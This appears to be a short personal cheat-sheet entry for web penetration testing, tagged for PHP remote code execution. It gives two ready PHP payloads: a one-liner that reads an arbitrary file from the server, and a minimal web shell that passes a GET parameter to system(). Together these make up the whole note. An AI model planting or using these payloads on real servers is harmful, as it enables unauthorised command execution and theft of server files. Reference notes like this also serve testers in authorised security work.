---
id: php_read_files
aliases: []
tags:
  - php
  - RCE
  - shell
  - web
---
### Read arbitrary files from server:
`<?php echo file_get_contents('/path/to/target/file'); ?>`

### Execute a command on server:
`<?php echo system($_GET['command']); ?>`


